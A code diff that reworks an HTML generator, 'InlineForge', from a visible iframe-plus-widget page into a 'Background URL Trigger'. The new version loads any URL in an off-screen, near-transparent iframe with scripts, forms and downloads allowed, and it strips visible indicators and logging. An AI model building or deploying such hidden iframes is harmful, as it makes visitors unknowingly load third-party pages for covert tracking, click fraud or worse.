@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>⚡ InlineForge · Standalone HTML Generator</title>
+    <title>⚡ InlineForge · Background URL Trigger</title>
     <style>
         * {
             box-sizing: border-box;
@@ -213,14 +213,14 @@
 <body>
 <div class="container">
     <div class="main-panel">
-        <h1>🎛️ InlineForge · Standalone HTML Generator</h1>
-        <div class="sub">⚡ Inject your widget code into a target URL → Generate hostable HTML → Copy & Deploy</div>
+        <h1>🎛️ InlineForge · Background URL Trigger</h1>
+        <div class="sub">⚡ ANY URL loads in background (tracking pixels, analytics, click trackers, music, websites) + Your widget on top</div>
 
         <div class="grid-2col">
             <div class="card">
-                <h2>📦 1. WIDGET CODE</h2>
-                <label>📝 Your HTML/JS/CSS widget (music player, overlay, etc.)</label>
-                <textarea id="widgetCode" placeholder='Example: music player widget'>&lt;div style="position:fixed; bottom:20px; right:20px; background:#0f172fe6; padding:12px 20px; border-radius:40px; backdrop-filter:blur(8px); z-index:99999; box-shadow:0 8px 20px black;"&gt;
+                <h2>📦 1. WIDGET CODE (optional)</h2>
+                <label>📝 HTML/JS/CSS that shows on screen (music player, overlay, or leave empty)</label>
+                <textarea id="widgetCode" placeholder='Leave empty or paste your widget'>&lt;div style="position:fixed; bottom:20px; right:20px; background:#0f172fe6; padding:12px 20px; border-radius:40px; backdrop-filter:blur(8px); z-index:99999; box-shadow:0 8px 20px black;"&gt;
   🎧 &lt;audio controls autoplay loop&gt;
     &lt;source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg"&gt;
   &lt;/audio&gt;
@@ -229,16 +229,13 @@
             </div>
 
             <div class="card">
-                <h2>🌐 2. TARGET WEBSITE</h2>
-                <label>🔗 URL to load in background iframe</label>
-                <input type="text" id="targetUrl" placeholder="https://example.com" value="https://example.com">
+                <h2>🌐 2. BACKGROUND URL (TRIGGER)</h2>
+                <label>🔗 ANY URL - loads & executes in background (tracking, analytics, website, audio, etc.)</label>
+                <input type="text" id="targetUrl" placeholder="https://example.com OR tracking pixel URL" value="https://example.com">
                 
                 <div class="checkbox-group">
                     <label>
-                        <input type="checkbox" id="invisibleMode" checked> 👻 Invisible iframe (background only)
-                    </label>
-                    <label>
-                        <input type="checkbox" id="muteAudio"> 🔇 Mute widget audio
+                        <input type="checkbox" id="muteAudio"> 🔇 Mute widget audio (if widget has audio)
                     </label>
                 </div>
                 
@@ -258,8 +255,9 @@
         
         <hr />
         <div class="footer-note">
-            💾 This tool generates a SINGLE HTML file. Host it anywhere. When opened, it loads your target website in an iframe + your widget floats on top.<br>
-            ✅ No CORS errors. No leaks. Just copy, host, and the widget runs automatically.
+            💾 The generated HTML loads your Background URL in an INVISIBLE iframe (off-screen, but fully loaded & executed).<br>
+            ✅ Perfect for tracking pixels, analytics, click trackers, background audio, or any URL that needs to trigger.<br>
+            ✅ No watermark, no visible elements from the background URL.
         </div>
     </div>
 </div>
@@ -267,16 +265,14 @@
 <script>
     const widgetCode = document.getElementById('widgetCode');
     const targetUrl = document.getElementById('targetUrl');
-    const invisibleMode = document.getElementById('invisibleMode');
     const muteAudio = document.getElementById('muteAudio');
     const generateBtn = document.getElementById('generateBtn');
     const copyBtn = document.getElementById('copyBtn');
     const outputCode = document.getElementById('outputCode');
 
     function generateStandaloneHTML() {
-        const widget = widgetCode.value.trim() || "<!-- No widget provided -->";
+        const widget = widgetCode.value.trim() || "";
         const target = targetUrl.value.trim() || "https://example.com";
-        const invisible = invisibleMode.checked;
         const mute = muteAudio.checked;
         
         // Escape for embedding in template literal
@@ -286,54 +282,42 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>InlineForge · ${target.replace(/https?:\/\//, '')}</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>InlineForge</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #000;
-            overflow: hidden;
-            height: 100vh;
-            width: 100vw;
+            background: transparent;
+            overflow: visible;
         }
-        .target-iframe {
+        /* Background iframe - COMPLETELY OFF SCREEN but FULLY LOADS & EXECUTES */
+        .background-trigger {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: -9999px;
+            left: -9999px;
+            width: 10px;
+            height: 10px;
             border: none;
-            ${invisible ? 'opacity: 0; pointer-events: none;' : ''}
-            z-index: 1;
+            opacity: 0.001;
+            pointer-events: none;
+            z-index: -99999;
         }
+        /* Widget overlay stays visible */
         .widget-overlay {
             position: fixed;
             z-index: 99999;
             pointer-events: auto;
         }
-        .status-badge {
-            position: fixed;
-            bottom: 8px;
-            left: 8px;
-            background: rgba(0,0,0,0.6);
-            color: #22c55e;
-            font-size: 10px;
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-family: monospace;
-            z-index: 100000;
-            pointer-events: none;
-        }
     </style>
 </head>
 <body>
-    <iframe class="target-iframe" src="${target}" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation-by-user-activation allow-downloads"></iframe>
+    <!-- Background URL loads here - FULLY EXECUTES, TRACKING PIXELS WORK -->
+    <iframe class="background-trigger" src="${target}" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation-by-user-activation allow-downloads allow-presentation"></iframe>
     <div class="widget-overlay" id="injectedWidget"></div>
-    <div class="status-badge">✅ InlineForge Active | ${target.substring(0, 50)}</div>
 
     <script>
         (function() {
-            const widgetHTML = \`${escapedWidget}\`;
+            ${widget ? `const widgetHTML = \`${escapedWidget}\`;` : 'const widgetHTML = "";'}
             const muteEnabled = ${mute};
             
             const container = document.getElementById('injectedWidget');
@@ -342,9 +326,8 @@
                 const audios = container.querySelectorAll('audio');
                 audios.forEach(audio => {
                     audio.volume = muteEnabled ? 0 : 1;
-                    audio.play().catch(e => console.log('Autoplay blocked - user interaction may be needed'));
+                    audio.play().catch(e => {});
                 });
-                console.log('[InlineForge] Widget loaded');
             }
         })();
     <\/script>
@@ -354,7 +337,6 @@
 
     function updateOutput() {
         const html = generateStandaloneHTML();
-        // Show preview (first 1500 chars)
         const preview = html.length > 1500 ? html.substring(0, 1500) + "\n... (full length " + html.length + " chars)" : html;
         outputCode.innerHTML = `<pre style="margin:0; font-family: monospace; white-space: pre-wrap; color:#b9e6ff;">${escapeHtml(preview)}</pre>`;
         outputCode.setAttribute('data-fullcode', html);
